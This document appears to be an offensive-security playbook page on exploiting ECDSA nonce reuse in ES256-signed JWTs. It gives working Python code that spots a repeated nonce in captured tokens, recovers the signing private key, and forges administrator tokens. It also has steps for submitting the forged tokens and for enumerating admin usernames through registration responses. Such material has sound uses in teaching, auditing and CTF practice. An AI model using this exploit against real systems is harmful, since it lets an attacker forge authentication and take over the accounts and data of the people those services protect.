# JWT — ECDSA Nonce Reuse (k-Reuse Private-Key Recovery)

## When this applies

The app's JWT header is `{"alg":"ES256"}` (or any ECDSA curve — P-256/P-384/secp256k1), and a code review of the signer's source — or a runtime observation — shows that the per-signature nonce `k` is either:

- Generated at **module import time** (`k = randint(1, q-1)` defined as a module-level constant), or
- Cached on the JWT-signer object and never rotated, or
- Sourced from a non-cryptographic RNG (Python's `random.randint`) under attacker-controllable seeding (system uptime, PID, low-entropy input).

When `k` is reused for two different message hashes, the standard ECDSA security proof breaks: the private key `d` is recoverable from any two captured signatures.

## Technique

For two ECDSA signatures `(r, s1)` and `(r, s2)` over messages with hashes `z1`, `z2` that share the same `r` (proving same `k`):

```
k = (z1 - z2) * inverse(s1 - s2)  mod q
d = (s1 * k  -  z1) * inverse(r)  mod q
```

`q` is the curve's group order (publicly known). `z1`/`z2` are the SHA-256 truncations of the signing input (`base64url(header) + "." + base64url(payload)`). The base64url-decoded signature splits into `r || s` for ES256 (32-byte halves). Once `d` is recovered, you mint arbitrary tokens with any payload using a standard ES256 library.

## Steps

1. Capture two distinct JWTs from the target. Register two accounts and log in each; the `aws_auth` / `session` cookie (or `Authorization: Bearer …`) is the JWT. Decode the header and check `"alg":"ES256"` (or similar ECDSA).

2. Confirm `k`-reuse by comparing the `r` half of both signatures:

   ```python
   import base64, hashlib
   def b64u_dec(s):
       s += '=' * (-len(s) % 4)
       return base64.urlsafe_b64decode(s)
   def split(jwt_str):
       h, p, sig = jwt_str.split('.')
       r_sig = b64u_dec(sig)
       r, s = int.from_bytes(r_sig[:32], 'big'), int.from_bytes(r_sig[32:], 'big')
       z = int.from_bytes(hashlib.sha256(f"{h}.{p}".encode()).digest(), 'big')
       return r, s, z
   r1, s1, z1 = split(JWT1)
   r2, s2, z2 = split(JWT2)
   assert r1 == r2, "no k-reuse; back to other vectors"
   ```

3. Recover `k` and `d` on the appropriate curve:

   ```python
   # P-256 order
   q = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
   def inv(a, n): return pow(a, -1, n)
   k = ((z1 - z2) * inv((s1 - s2) % q, q)) % q
   d = ((s1 * k - z1) * inv(r1, q)) % q
   print(f"d = {d:064x}")
   ```

   For `secp256k1`, swap `q` for `0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141`. For P-384 use 48-byte halves and the P-384 order.

4. Reconstruct the PEM private key from the integer and forge tokens:

   ```python
   from ecdsa import SigningKey, NIST256p
   sk = SigningKey.from_secret_exponent(d, curve=NIST256p)
   import jwt
   token = jwt.encode({"username":"<ADMIN_USER>","role":"Administrator"}, sk.to_pem(), algorithm="ES256")
   ```

   Verify with the target's published public key (often exposed at `/api/v1/jwks`, `/.well-known/jwks.json`, or inferable from the server's TLS cert in the same project).

5. Submit the forged token as the auth cookie and verify privileged-route access.

## Verifying success

- The recovered `d` re-signs your captured JWTs and produces byte-identical signatures (round-trip check) — this is the strongest correctness signal.
- Forged admin JWT grants access to `/admin/*` (or equivalent) routes that previously returned 403.
- `d * G` matches the published public key point (do this on first run; never bypass).

## Common pitfalls

- ES256 signatures sometimes serialize as ASN.1 DER instead of `r||s` concatenation. Distinguish by length: DER signatures are variable (`0x30 0x4? ...`); IEEE P1363 is always 64 bytes (32+32) for ES256. Convert before extracting `r,s`.
- The `z` hash truncation rule: for P-256 the message hash is the full 32-byte SHA-256; for P-521 truncate to 521 bits. Skipping the truncation step produces non-integers `d` that look almost right but fail verification.
- Some implementations XOR `k` with a counter per call — `r` still matches across signatures from the SAME process restart, but a server restart picks a fresh `k`. Capture both JWTs within one process lifetime; re-derive after any obvious restart (HTTP 502, scheduler heartbeat reset, etc.).
- Forging with the wrong `username` claim — many apps maintain a server-side session/role lookup keyed by `username`. Forge with a username the app's DB actually contains as an admin; enumerate via /register collision (`"username already registered"` ≠ `"username available"`) to confirm before forging.

## Tools

- Python `ecdsa`, `pyjwt`, `cryptography` packages.
- `jwt_tool` — kid manipulation + alg confusion; useful in tandem.
- Manual `inv(a, n) = pow(a, -1, n)` requires Python 3.8+.

## Related

- [weak-secret-crack.md](weak-secret-crack.md) — when alg is HS256.
- [alg-confusion.md](alg-confusion.md) — when the server accepts both ES and HS.
- [psychic-signatures-cve-2022-21449.md](psychic-signatures-cve-2022-21449.md) — Java ECDSA `(0,0)` bypass; structurally similar root-cause class.
